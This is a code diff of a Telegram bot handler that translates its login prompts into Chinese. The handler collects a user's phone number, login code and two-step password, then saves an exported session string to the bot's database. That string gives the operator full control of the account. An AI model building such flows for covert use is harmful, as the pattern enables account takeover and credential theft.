@@ -75,57 +75,53 @@ async def generate_session(_, message):
     if joined == 1:
         return
         
-    # user_checked = await chk_user(message, message.from_user.id)
-    # if user_checked == 1:
-        # return
-        
     user_id = message.chat.id   
     
-    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
+    number = await _.ask(user_id, '请输入你的电话号码,带区号. \n比如: +19876543210', filters=filters.text)   
     phone_number = number.text
     try:
-        await message.reply("📲 Sending OTP...")
+        await message.reply("📲 正在发送验证码...")
         client = Client(f"session_{user_id}", api_id, api_hash)
         
         await client.connect()
     except Exception as e:
-        await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
+        await message.reply(f"❌ 发送验证码失败 {e}. 请稍候重试.")
     try:
         code = await client.send_code(phone_number)
     except ApiIdInvalid:
-        await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
+        await message.reply('❌ 系统错误,请联系管理员.')
         return
     except PhoneNumberInvalid:
-        await message.reply('❌ Invalid phone number. Please restart the session.')
+        await message.reply('❌ 请输入正确的电话号码.')
         return
     try:
-        otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
+        otp_code = await _.ask(user_id, "请检查你的telegram账号,如果收到登录验证码,请按照指引操作: \n假如你收到的验证码是 `12345`, 请回复 `1 2 3 4 5`.", filters=filters.text, timeout=600)
     except TimeoutError:
-        await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
+        await message.reply('⏰ 操作超时,请重试.')
         return
     phone_code = otp_code.text.replace(" ", "")
     try:
         await client.sign_in(phone_number, code.phone_code_hash, phone_code)
                 
     except PhoneCodeInvalid:
-        await message.reply('❌ Invalid OTP. Please restart the session.')
+        await message.reply('❌ 验证码错误.')
         return
     except PhoneCodeExpired:
-        await message.reply('❌ Expired OTP. Please restart the session.')
+        await message.reply('❌ 验证码已过期,请重试获取.')
         return
     except SessionPasswordNeeded:
         try:
-            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
+            two_step_msg = await _.ask(user_id, '你的账号开启了两步验证,请输入密码.', filters=filters.text, timeout=300)
         except TimeoutError:
-            await message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
+            await message.reply('⏰ 操作超时,请重试.')
             return
         try:
             password = two_step_msg.text
             await client.check_password(password=password)
         except PasswordHashInvalid:
-            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
+            await two_step_msg.reply('❌ 密码错误.')
             return
     string_session = await client.export_session_string()
     await db.set_session(user_id, string_session)
     await client.disconnect()
-    await otp_code.reply("✅ Login successful!")
+    await otp_code.reply("✅ 登录成功!")
